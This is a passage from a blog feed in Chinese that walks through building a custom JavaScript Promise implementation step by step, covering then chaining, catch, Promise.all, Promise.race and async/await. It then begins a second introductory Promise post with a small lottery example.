class="hljs-built_in">Promise</span>) &#123;<br>                result.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                    resolve(value)<br>                &#125;, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>                    reject(reason)<br>                &#125;)<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//一个非Promise对象，返回设置为成功</span><br>                resolve(result)<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            reject(e)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.PromiseState === <span class="hljs-string">&#x27;rejected&#x27;</span>) &#123;<br>        onRejected(<span class="hljs-built_in">this</span>.PromsieResult)<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.PromiseState === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-comment">//在pending状态下需要保存回调</span><br>        <span class="hljs-built_in">this</span>.callbacks.push(&#123;<br>            onResolved,<br>            onRejected<br>        &#125;)<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>其中result收到了回调函数的执行结果，也就是你then中return的东西，然后对这个结果进行判断，但是如果我们是throw的错误，就需要通过try—catch捕获，更改状态，然后返回给then。</p><h2 id="7-异步的返回"><a href="#7-异步的返回" class="headerlink" title="7.异步的返回"></a>7.异步的返回</h2><p>但是我们这样写有一个很大的问题，异步的callback我们只录入了onResolved，没有返回一个promise对象更没有进行判断和更改对象的状态这个步骤。</p><p>于是我们在保存回调函数的时候，就需要给回调函数加上判断和状态的更改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript">onResolved: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//获取执行成功的结果</span><br>        <span class="hljs-keyword">let</span> result = onResolved(self.PromiseResult)<br>        <span class="hljs-comment">//类似的判断</span><br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Promise</span>) &#123;<br>            result.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                resolve(value)<br>            &#125;, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>                reject(reason)<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//一个非Promise对象，返回设置为成功</span><br>            resolve(result)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        reject(e)<br>    &#125;<br>&#125;,<br><span class="hljs-attr">onRejected</span>: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">let</span> result = onRejected(self.PromiseResult)<br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Promise</span>) &#123;<br>            result.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                resolve(value)<br>            &#125;, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>                reject(reason)<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//一个非Promise对象，返回设置为成功</span><br>            resolve(result)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        reject(e)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码有很多相同的部分，封装起来复用:</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">const</span> self = <span class="hljs-built_in">this</span><br><span class="hljs-comment">//将判断封装成函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">OnCall</span>(<span class="hljs-params"><span class="hljs-keyword">type</span></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//获取回调函数的执行结果</span><br>        <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">type</span>(self.PromiseResult)<span class="hljs-comment">//Result传入第一个函数作为实参value</span><br>        <span class="hljs-comment">//如果是一个promise对象，则根据这个对象的状态设置result</span><br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Promise</span>) &#123;<br>            result.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                resolve(value)<br>            &#125;, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>                reject(reason)<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//一个非Promise对象，返回设置为成功</span><br>            resolve(result)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        reject(e)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-Promise中加入catch"><a href="#8-Promise中加入catch" class="headerlink" title="8.Promise中加入catch"></a>8.Promise中加入catch</h2><p>通过调用p.catch实现对于错误的捕捉，这里只需要传入一个onRejected参数，需要返回一个promise对象就直接调用then方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">Promise</span>.prototype.catch = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">onRejected</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.then(<span class="hljs-literal">undefined</span>,onRejected)<br>&#125;<br></code></pre></td></tr></table></figure><p>还有在异常穿透中的错误捕捉，但是异常穿透的then方法中没有reason回调（会报错），我们需要在原型then中加上</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//判断是否有reason回调,没有的话onRejected的类型不会是一个函数</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> onRejected !== <span class="hljs-string">&#x27;function&#x27;</span>)&#123;<br>    <span class="hljs-comment">//将onRejected变成一个函数</span><br>    onRejected = <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">throw</span> reason<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们也可以在promise中写出这样的方法</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">p.<span class="hljs-keyword">then</span>().<span class="hljs-keyword">then</span>(value =&gt; &#123;<br>    reject(<span class="hljs-string">&quot;err&quot;</span>)<br>    <span class="hljs-regexp">//</span>返回一个pending类型的promise对象时中断链式<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span>&#123;&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>为了实现这种写法，我们需要对onResolved也进行补全</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> onRejected !== <span class="hljs-string">&#x27;function&#x27;</span>)&#123;<br>        <span class="hljs-comment">//将onRejected变成一个函数</span><br>        onRejected = <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">throw</span> reason<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//onResloved没传也需要添加</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> onResolved !== <span class="hljs-string">&#x27;function&#x27;</span>)&#123;<br>        onResolved = <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value<br>        <span class="hljs-comment">//等同于&#123;return value&#125;</span><br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="9-封装resolve和reject方法"><a href="#9-封装resolve和reject方法" class="headerlink" title="9.封装resolve和reject方法"></a>9.封装resolve和reject方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//封装resolve方法，属于promise实例对象而不是原型对象</span><br><span class="hljs-built_in">Promise</span>.resolve = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-comment">//判断是否为promise对象</span><br>        <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Promise</span>) &#123;<br>            value.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> &#123;<br>                resolve(value)<br>            &#125;, <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>                reject(reason)<br>            &#125;)<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//这里的this指向promise对象</span><br>            <span class="hljs-comment">//如果使用this.resolve指向的便是我们这个函数，会导致递归栈溢出</span><br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.resolve);<br>            resolve(value)<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>注意这里this.resolve 和 resolve的区别</p><p>reject方法与resolve类似，只是无论value是什么都是调用reject</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//封装reject方法，属于promise实例对象而不是原型对象</span><br><span class="hljs-built_in">Promise</span>.reject = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        reject(value)<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-封装all方法"><a href="#10-封装all方法" class="headerlink" title="10.封装all方法"></a>10.封装all方法</h2><p>all方法的返回看得是整个传入数组，如果有失败则返回第一个失败对象，如果全部成功才返回成功对象而且包含所有成功value</p><p>第一种可以使用every方法，但是会有异步问题</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class="hljs-comment">// every方法——简洁但是有异步问题</span><br>    <span class="hljs-keyword">let</span> arr = [] <br>    <span class="hljs-keyword">const</span> result = Promises.every(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)</span>&#123;<br>        arr.push(item.PromiseResult)<br>        <span class="hljs-keyword">return</span> item.PromiseState === <span class="hljs-string">&quot;fulfilled&quot;</span><br>    &#125;)<br>    <span class="hljs-built_in">console</span>.log(result);<br>    <span class="hljs-keyword">if</span>(result)&#123;<br>        resolve(arr)<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        reject()<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><p>所谓异步问题是：如果我们的p1是延时回调，那么p1虽然在数组中排第一个，但是在返回的数组中就排到了最后一个。</p><p>第二种使用我们的常规方法：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//遍历数组方法——复杂一点但是易维护</span><br><span class="hljs-comment">//设置变量</span><br><span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span><br><span class="hljs-keyword">let</span> arr = <span class="hljs-literal">[]</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span> ; i&lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promises</span>.</span></span>length ;i++)&#123;<br>    <span class="hljs-comment">//调用then方法</span><br>    Promises<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.<span class="hljs-keyword">then</span>(value =&gt; &#123;<br>        <span class="hljs-comment">//统计成功值</span><br>        arr<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = value<br>        count++<br>        <span class="hljs-keyword">if</span>(count<span class="hljs-operator"> === </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promises</span>.</span></span>length)&#123;<br>            <span class="hljs-comment">//说明全部成功，传入成功数组</span><br>            resolve(arr)<br>        &#125;<br>    &#125;,reason =&gt; &#123;<br>        reject(reason)<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>这样子我们的异步问题便解决了</p><h2 id="11-封装race方法"><a href="#11-封装race方法" class="headerlink" title="11.封装race方法"></a>11.封装race方法</h2><p>race方法也是接收一个promise数组，返回一个promise对象。返回的promise对象的状态由第一个改变状态的数组对象决定</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//添加promise.race方法</span><br><span class="hljs-built_in">Promise</span>.race = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">promises</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class="hljs-comment">//遍历promises数组</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;promises.length;i++)&#123;<br>            <span class="hljs-comment">//谁先第一个改变，就改为谁的状态</span><br>            promises[i].then(<span class="hljs-function"><span class="hljs-params">value</span>=&gt;</span>&#123;<br>                resolve(value)<br>            &#125;,<span class="hljs-function"><span class="hljs-params">reason</span>=&gt;</span>&#123;<br>                reject(reason)<br>            &#125;)<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>这里包含了一个调用的先后顺序问题，依然使用for循环解决，谁先调用，谁的then方法就先奏效。</p><h2 id="12-then方法的异步执行"><a href="#12-then方法的异步执行" class="headerlink" title="12.then方法的异步执行"></a>12.then方法的异步执行</h2><p>then方法中的操作是异步执行，最主要的特点就是需要在同步代码执行完毕后执行</p><p>为了将then方法转换为异步，我们需要在调用resolve和reject还有使用call(onResloved)的时候加入setTimeout，将函数改为异步</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>    self.callbacks.forEach(callback =&gt; &#123;<br>        callback.onResolved(value)<br>    &#125;);<br>    <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.PromiseState === <span class="hljs-string">&#x27;fulfilled&#x27;</span>) &#123;<br>    <span class="hljs-regexp">//</span>添加异步任务<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>        OnCall(onResolved)<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-将promise封装成类"><a href="#13-将promise封装成类" class="headerlink" title="13.将promise封装成类"></a>13.将promise封装成类</h2><p>为了实现promise的封装性，我们将promise封装成类</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">class</span> <span class="hljs-variable">promise</span> &#123;<br>    <span class="hljs-comment">//构造函数</span><br>    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-variable">executor</span>) &#123;&#125;</span><br><span class="hljs-function">    </span><br><span class="hljs-function">    <span class="hljs-title">then</span>()</span><br>    <br>    <span class="hljs-variable">static</span> <span class="hljs-function"><span class="hljs-title">all</span>()</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>封装完成之后调试一下，得到和之前一眼的结果！！</p><p>赏心悦目</p><h2 id="14-async函数"><a href="#14-async函数" class="headerlink" title="14.async函数"></a>14.async函数</h2><p>返回一个promise类型的对象，对象的结果由async的return值决定</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">async <span class="hljs-keyword">function</span> main() &#123;<br>    <span class="hljs-regexp">//</span>返回的数值决定了返回的promise对象<br>    <span class="hljs-regexp">//</span> return <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-regexp">//</span> return new Promise((reslove,reject)=&gt;&#123;<br>    <span class="hljs-regexp">//</span>     reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>    <span class="hljs-regexp">//</span> &#125;)<br><br>    throw <span class="hljs-string">&quot;err&quot;</span><br>&#125;<br><br>let result = main()<br><br>console.log(result);<br></code></pre></td></tr></table></figure><h2 id="15-await函数"><a href="#15-await函数" class="headerlink" title="15.await函数"></a>15.await函数</h2><p>await函数的右边是一个promise或者promise对象</p><p>如果右边是一个成功的promise对象，那么我们得到的就是成功promise对象的结果</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">async</span> function main() &#123;<br>    <span class="hljs-regexp">//</span>返回的数值决定了返回的promise对象<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(reslove,reject)</span>=&gt;</span>&#123;<br>    <span class="hljs-regexp">//</span>     reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>    <span class="hljs-regexp">//</span> &#125;)<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;err&quot;</span><br>    let p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(reslove, reject)</span> =&gt;</span> &#123;<br>        reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>    &#125;)<br><br>    let res = <span class="hljs-keyword">await</span> p<br><br>    <span class="hljs-built_in">console</span>.log(res);<br>&#125;<br><br>let result = main()<br><br><span class="hljs-built_in">console</span>.log(result);<br></code></pre></td></tr></table></figure><p>如果右边是一个失败的promise对象，那么我们需要用一个try_catch捕获失败原因</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">async</span> function main() &#123;<br>    <span class="hljs-regexp">//</span>返回的数值决定了返回的promise对象<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(reslove,reject)</span>=&gt;</span>&#123;<br>    <span class="hljs-regexp">//</span>     reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>    <span class="hljs-regexp">//</span> &#125;)<br>    <span class="hljs-regexp">//</span> <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;err&quot;</span><br>    let p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(reslove, reject)</span> =&gt;</span> &#123;<br>        reject(<span class="hljs-string">&quot;OK&quot;</span>)<br>    &#125;)<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        let res = <span class="hljs-keyword">await</span> p<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(e) &#123;<br>        <span class="hljs-built_in">console</span>.log(res);<br>    &#125;<br><br>&#125;<br><br>let result = main()<br><br><span class="hljs-built_in">console</span>.log(result);<br></code></pre></td></tr></table></figure><p>如果右边是一个非promise对象，那么我们得到的就是对象的数值</p><p>实际工程当中我们经常使用async和await处理promise的操作</p>]]></content>
    
    
    <categories>
      
      <category>Promise</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Promise</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Promise</title>
    <link href="/2022/06/04/Promise/"/>
    <url>/2022/06/04/Promise/</url>
    
    <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h2 id="1-何为Promise"><a href="#1-何为Promise" class="headerlink" title="1.何为Promise"></a>1.何为Promise</h2><p>首先说一下promise 是什么？</p><p>1、本质是构造函数中主要用于异步计算</p><p>2、可以将异步操作队列化，按照期望的顺序执行，返回符合预期的结果</p><p>其次主要处理异步和操作同步化</p><h2 id="2-Promise的好处"><a href="#2-Promise的好处" class="headerlink" title="2.Promise的好处"></a>2.Promise的好处</h2><h3 id="2-1-指定回调函数的方式更加灵活"><a href="#2-1-指定回调函数的方式更加灵活" class="headerlink" title="2.1.指定回调函数的方式更加灵活"></a>2.1.指定回调函数的方式更加灵活</h3><p>（1）：旧的回调必须在启动异步任务前指定，比如setTimeout</p><p>（2）：promise则是：启动异步任务 =&gt; 返回promise对象 =&gt; 给promise对象绑定回调函数</p><h3 id="2-2-支持链式调用，可以解决回调地狱问题"><a href="#2-2-支持链式调用，可以解决回调地狱问题" class="headerlink" title="2.2.支持链式调用，可以解决回调地狱问题"></a>2.2.支持链式调用，可以解决回调地狱问题</h3><p>（1）：回调地狱？</p><p>回调地狱就是回调函数的嵌套调用，外部回调函数异步执行的结果是嵌套的回调执行的条件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">as</span><span class="hljs-constructor">Func1(<span class="hljs-params">opt</span>, (<span class="hljs-operator">...</span><span class="hljs-params">args1</span>)</span>=&gt;&#123;<br><span class="hljs-keyword">as</span><span class="hljs-constructor">Func2(<span class="hljs-params">opt</span>, (<span class="hljs-operator">...</span><span class="hljs-params">args2</span>)</span>=&gt;&#123;<span class="hljs-operator"></span><br><span class="hljs-operator">...</span><br><span class="hljs-operator"></span>&#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>（2）：解决方案？</p><p>promise的链式调用</p><h2 id="3-Promise的小应用"><a href="#3-Promise的小应用" class="headerlink" title="3.Promise的小应用"></a>3.Promise的小应用</h2><h3 id="3-1-一个小小的抽奖程序"><a href="#3-1-一个小小的抽奖程序" class="headerlink" title="3.1.一个小小的抽奖程序"></a>3.1.一个小小的抽奖程序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//rand生成随机数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rand</span>(<span class="hljs-params">m, n</span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.ceil(<span class="hljs-built_in">Math</span>.random() * (n - m + <span class="hljs-number">1</span>) + m - <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">const</span> btn = <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&quot;#btn&quot;</span>)<br><span class="hljs-comment">// 绑定点击事件</span><br>btn.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">// console.log(&quot;hello promise&quot;)</span><br>    <span class="hljs-comment">//创建一个promise的实例对象</span><br>    <span class="hljs-comment">//resolve代表解决 函数类型对象</span><br>    <span class="hljs-comment">//reject代表拒绝 函数类型对象</span><br>    <span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span 